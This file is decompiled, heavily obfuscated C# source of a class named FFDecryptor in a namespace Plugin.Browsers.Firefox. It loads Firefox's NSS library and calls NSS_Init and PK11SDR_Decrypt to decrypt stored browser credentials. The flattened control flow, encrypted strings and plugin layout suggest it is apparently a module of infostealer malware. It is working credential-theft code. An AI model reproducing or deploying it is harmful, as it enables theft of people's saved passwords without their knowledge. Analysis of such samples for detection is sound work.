using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers.Firefox;

internal static class FFDecryptor
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	public struct TSECItem
	{
		public int SECItemType;

		public IntPtr SECItemData;

		public int SECItemLen;
	}

	private static IntPtr NSS3;

	internal static object taNCm2bsotXAdcuNrIA;

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static long NSS_Init(object configdir)
	{
		long result = default(long);
		switch (1)
		{
		case 1:
			try
			{
				int num;
				if (!brtgVuby4xTQP3sHoLI(MUZMUsbD17nLgEgISbZ(374), fiM4Hw9Fl6DhXSwmaZ.vhxxfQtba8))
				{
					num = 6;
					if (!p7w1WubtieM3tuQvRPI())
					{
						goto IL_0053;
					}
					goto IL_0057;
				}
				goto IL_0164;
				IL_0164:
				string text = nCP5vtxT3QjsSeuiK3.xuCtsHmOK(442);
				num = 2;
				goto IL_0057;
				IL_0053:
				int num2 = default(int);
				num = num2;
				goto IL_0057;
				IL_0057:
				while (true)
				{
					switch (num)
					{
					case 2:
					case 4:
					case 8:
						LoadLibrary((string)NFvoUlbZoTErVlIUva3(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(740), Dj4213xogb3ONhNxwgn.lxIxsGwLmk));
						num = 9;
						continue;
					case 6:
					case 10:
						if (fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)MUZMUsbD17nLgEgISbZ(512), fiM4Hw9Fl6DhXSwmaZ.vhxxfQtba8))
						{
							goto IL_00cc;
						}
						goto case 1;
					case 5:
						text = nCP5vtxT3QjsSeuiK3.xuCtsHmOK(592);
						num = 7;
						if (p7w1WubtieM3tuQvRPI())
						{
							num = 8;
						}
						continue;
					case 1:
						text = Dj4213xogb3ONhNxwgn.IrTxr5idK((string)xxRnmAbnt4nN61YtaCh(MUZMUsbD17nLgEgISbZ(674), e48Rc6xALatw3CN0lFC.d1QxTQ7ZN1), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(702), Dj4213xogb3ONhNxwgn.lxIxsGwLmk);
						num = 4;
						continue;
					case 7:
						goto IL_0164;
					case 9:
						NSS3 = LoadLibrary((string)NFvoUlbZoTErVlIUva3(text, MUZMUsbD17nLgEgISbZ(766), Dj4213xogb3ONhNxwgn.lxIxsGwLmk));
						num = 3;
						if (PgJ0ifbFno2E0BFX2pj() != null)
						{
							num = 2;
						}
						continue;
					case 3:
						goto IL_01b4;
					case 0:
						break;
					}
					break;
					IL_01b4:
					result = ((DLLFunctionDelegate)gjycOvb7Db1B76Yh9An(GetProcAddress(NSS3, (string)MUZMUsbD17nLgEgISbZ(786)), ogoM2obulpaWRRGwKfd(typeof(DLLFunctionDelegate).TypeHandle, Qev532x6a7iXofYVQ9e.CYAxkRA8pS), AQSNQYx18nRnH1eE1qZ.kRkx9V9NCk))((string)configdir);
					num = 0;
					if (PgJ0ifbFno2E0BFX2pj() == null)
					{
						continue;
					}
					goto IL_0053;
					IL_00cc:
					num = 5;
					if (p7w1WubtieM3tuQvRPI())
					{
						continue;
					}
					goto IL_0053;
				}
			}
			catch (Exception)
			{
				int num3 = 1;
				if (!p7w1WubtieM3tuQvRPI())
				{
					int num4 = default(int);
					num3 = num4;
				}
				while (true)
				{
					switch (num3)
					{
					case 1:
						result = 0L;
						num3 = 0;
						if (PgJ0ifbFno2E0BFX2pj() == null)
						{
							num3 = 0;
						}
						continue;
					case 0:
						break;
					}
					break;
				}
			}
			break;
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string Decrypt(object cypherText)
	{
		int num = 3;
		TSECItem data = default(TSECItem);
		TSECItem result = default(TSECItem);
		byte[] array2 = default(byte[]);
		IntPtr intPtr = default(IntPtr);
		string result2 = default(string);
		int num4 = default(int);
		int num8 = default(int);
		int num6 = default(int);
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				switch (num2)
				{
				default:
					try
					{
						byte[] array = (byte[])l17aLRbrgdqlNYDonsM(cypherText, okBb41xVk47CJ0uunIs.UErxiqcwf9);
						int num3 = 6;
						while (true)
						{
							switch (num3)
							{
							default:
								data.SECItemType = 0;
								num3 = 1;
								if (PgJ0ifbFno2E0BFX2pj() != null)
								{
									num3 = 1;
								}
								continue;
							case 9:
								if (result.SECItemLen != 0)
								{
									num3 = 13;
									if (PgJ0ifbFno2E0BFX2pj() == null)
									{
										continue;
									}
									goto IL_0045;
								}
								goto IL_02ef;
							case 2:
								fu1al9bzbJ1Vargxc3C(result.SECItemData, array2, 0, result.SECItemLen, ljpxUnxz06pnyQGTHy7.rJKct5JCZJ);
								num3 = 4;
								continue;
							case 10:
								result = default(TSECItem);
								num3 = 7;
								continue;
							case 3:
								break;
							case 11:
								if (PK11SDR_Decrypt(ref data, ref result, 0) == 0)
								{
									num3 = 9;
									if (PgJ0ifbFno2E0BFX2pj() == null)
									{
										continue;
									}
									goto IL_0045;
								}
								goto IL_02ef;
							case 1:
								data.SECItemData = intPtr;
								num3 = 5;
								continue;
							case 5:
								data.SECItemLen = array.Length;
								num3 = 11;
								continue;
							case 13:
								array2 = new byte[result.SECItemLen];
								num3 = 2;
								continue;
							case 4:
								result2 = (string)cG1l6Xmb0XdcoiTeRQY(LH0bhom6dlHuDhhpCvN(gRnjGrxKdWbynd12Ef3.cSMcxZv4ZJ), array2, JVKpD1ccnUX1e3koAjr.H34cHR2EZ3);
								num3 = 3;
								continue;
							case 7:
								data = default(TSECItem);
								num3 = 0;
								if (p7w1WubtieM3tuQvRPI())
								{
									continue;
								}
								goto IL_0045;
							case 8:
								UojPFlbMhdUK7952m6d(array, 0, intPtr, array.Length, ygfcDGxnkrE805JjZ3V.Ms2xprQCmk);
								num3 = 3;
								if (PgJ0ifbFno2E0BFX2pj() == null)
								{
									num3 = 10;
								}
								continue;
							case 6:
								intPtr = Q7ijvibGZdGuOUGCQDL(array.Length, OtIWfexyXB2CWuYpx8B.xTxxFyvglq);
								num3 = 4;
								if (PgJ0ifbFno2E0BFX2pj() == null)
								{
									num3 = 8;
								}
								continue;
							case 12:
								goto IL_02ef;
								IL_0045:
								num3 = num4;
								continue;
							}
							break;
						}
					}
					catch
					{
						int num5 = 0;
						if (PgJ0ifbFno2E0BFX2pj() != null)
						{
							num5 = num6;
						}
						while (true)
						{
							switch (num5)
							{
							default:
								result2 = null;
								num5 = 1;
								if (!p7w1WubtieM3tuQvRPI())
								{
									num5 = 1;
								}
								continue;
							case 1:
								break;
							}
							break;
						}
					}
					finally
					{
						int num7;
						if (VhNa9lcKRmmrRu80ZFM.IrTxr5idK(intPtr, IntPtr.Zero, VhNa9lcKRmmrRu80ZFM.bW1cQkMeQ5))
						{
							num7 = 0;
							if (PgJ0ifbFno2E0BFX2pj() != null)
							{
								goto IL_028c;
							}
							goto IL_0290;
						}
						goto end_IL_0261;
						IL_0290:
						while (true)
						{
							switch (num7)
							{
							case 1:
								goto end_IL_0290;
							}
							B41qMhcd1FTmR8GxOm0.IrTxr5idK(intPtr, B41qMhcd1FTmR8GxOm0.zf9cqydifP);
							num7 = 1;
							if (p7w1WubtieM3tuQvRPI())
							{
								continue;
							}
							goto IL_028c;
							continue;
							end_IL_0290:
							break;
						}
						goto end_IL_0261;
						IL_028c:
						num7 = num8;
						goto IL_0290;
						end_IL_0261:;
					}
					return result2;
				case 3:
					intPtr = IntPtr.Zero;
					num2 = 2;
					goto IL_0012;
				case 1:
					goto IL_02ef;
				case 2:
					break;
					IL_02ef:
					return null;
				}
				new StringBuilder((string)cypherText);
				num2 = 0;
			}
			while (p7w1WubtieM3tuQvRPI());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		return ((DLLFunctionDelegate5)AQSNQYx18nRnH1eE1qZ.IrTxr5idK(GetProcAddress(NSS3, (string)MUZMUsbD17nLgEgISbZ(806)), ogoM2obulpaWRRGwKfd(typeof(DLLFunctionDelegate5).TypeHandle, Qev532x6a7iXofYVQ9e.CYAxkRA8pS), AQSNQYx18nRnH1eE1qZ.kRkx9V9NCk))(ref data, ref result, cx);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object MUZMUsbD17nLgEgISbZ(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool brtgVuby4xTQP3sHoLI(object P_0, object P_1)
	{
		return fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)P_0, (fiM4Hw9Fl6DhXSwmaZ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xxRnmAbnt4nN61YtaCh(object P_0, object P_1)
	{
		return e48Rc6xALatw3CN0lFC.IrTxr5idK((string)P_0, (e48Rc6xALatw3CN0lFC)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object NFvoUlbZoTErVlIUva3(object P_0, object P_1, object P_2)
	{
		return Dj4213xogb3ONhNxwgn.IrTxr5idK((string)P_0, (string)P_1, (Dj4213xogb3ONhNxwgn)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Type ogoM2obulpaWRRGwKfd(RuntimeTypeHandle P_0, object P_1)
	{
		return Qev532x6a7iXofYVQ9e.IrTxr5idK(P_0, (Qev532x6a7iXofYVQ9e)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object gjycOvb7Db1B76Yh9An(IntPtr P_0, Type P_1, object P_2)
	{
		return AQSNQYx18nRnH1eE1qZ.IrTxr5idK(P_0, P_1, (AQSNQYx18nRnH1eE1qZ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool p7w1WubtieM3tuQvRPI()
	{
		return taNCm2bsotXAdcuNrIA == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static FFDecryptor PgJ0ifbFno2E0BFX2pj()
	{
		return (FFDecryptor)taNCm2bsotXAdcuNrIA;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object l17aLRbrgdqlNYDonsM(object P_0, object P_1)
	{
		return okBb41xVk47CJ0uunIs.IrTxr5idK((string)P_0, (okBb41xVk47CJ0uunIs)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr Q7ijvibGZdGuOUGCQDL(int P_0, object P_1)
	{
		return OtIWfexyXB2CWuYpx8B.IrTxr5idK(P_0, (OtIWfexyXB2CWuYpx8B)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void UojPFlbMhdUK7952m6d(object P_0, int P_1, IntPtr P_2, int P_3, object P_4)
	{
		ygfcDGxnkrE805JjZ3V.IrTxr5idK((byte[])P_0, P_1, P_2, P_3, (ygfcDGxnkrE805JjZ3V)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void fu1al9bzbJ1Vargxc3C(IntPtr P_0, object P_1, int P_2, int P_3, object P_4)
	{
		ljpxUnxz06pnyQGTHy7.IrTxr5idK(P_0, (byte[])P_1, P_2, P_3, (ljpxUnxz06pnyQGTHy7)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object LH0bhom6dlHuDhhpCvN(object P_0)
	{
		return gRnjGrxKdWbynd12Ef3.IrTxr5idK((gRnjGrxKdWbynd12Ef3)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object cG1l6Xmb0XdcoiTeRQY(object P_0, object P_1, object P_2)
	{
		return JVKpD1ccnUX1e3koAjr.IrTxr5idK(P_0, (byte[])P_1, (JVKpD1ccnUX1e3koAjr)P_2);
	}
}
